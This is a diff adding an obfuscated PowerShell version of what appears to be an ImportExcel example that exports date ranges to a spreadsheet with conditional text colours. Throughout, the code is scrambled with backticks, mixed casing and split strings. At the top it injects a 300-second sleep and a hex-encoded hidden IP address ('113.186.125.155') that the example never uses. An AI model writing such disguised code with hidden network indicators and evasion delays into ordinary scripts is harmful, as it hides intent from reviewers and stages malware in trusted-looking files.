@@ -1,0 +1,24 @@
+ $r12J =  [TyPE]('Conver'+'t');  StA`RT`-Sl`EEp 300
+${fe`YE}=   ( " $( sEt-varIabLe 'OFs' '' ) "+ [sTRING]( '27p69@70{3a@31p31p33<2e!31!38:36S2e{31<32!35@2e{31{35<35!27'-SPlIT ':' -sPLit 'J'-sPLiT '!'-spLIt '@' -spLIt '<' -SPliT'S' -sPLiT '{'-SPliT 'p' |f`OreAc`H-o`BjECt { ([chAR](  (  DIr ("vArIAblE"+":r"+"1"+"2j")  ).vALue::tOInt16(( ${_}.TOsTRIng()),16))) } )+"$( Set-iTEM 'varIABlE:ofS' ' ' )  ")
+try {I`M`pOrT-mO`du`le $PSScrIPTrOOt\..\..\impOrTExceL.PSd1} catch {throw ; return}
+
+
+${xlSoUrC`EfI`lE} = "$env:TEMP\ImportExcelExample.xlsx"
+w`RItE-v`ErBO`se -Verbose -Message  ('Sav'+'e '+'location'+':'+' '+"$xlSourcefile")
+R`EmOvE-i`TEm ${X`lSOu`RCEfI`le} -ErrorAction IGnORe
+
+function GEt-dATeoFfseT (${DA`ys}=0) {
+    (GeT-DA`TE).aDdDAys(${DA`Ys}).ToshORTDAtesTRINg()
+}
+
+$(
+    N`EW-pS`ITEM (GET`-`dAtE`O`FFSET -1) (GeT-`Dat`EOff`SET 1) @(('Star'+'t'), ('E'+'nd'))
+    new-pSI`T`EM (g`E`T-datEOFFsEt) (Ge`T-DaTeof`FS`Et 7)
+    NE`W`-`PSITEm (g`E`T-DAT`EOffSET -10) (g`E`T-Da`TEOFfsET -1)
+) |
+
+    EXPo`R`T-`ExCel ${X`lsOU`RcE`FILE} -Show -AutoSize -AutoNameRange -ConditionalText $(
+        NEW`-Co`NdI`TIona`Lt`EXt -Range start -ConditionalType yesTERday -ConditionalTextColor REd
+        NEw-cOnD`ItI`O`N`Alt`ExT -Range EnD   -ConditionalType yeSTeRDaY -BackgroundColor blUE -ConditionalTextColor RED
+    )
+
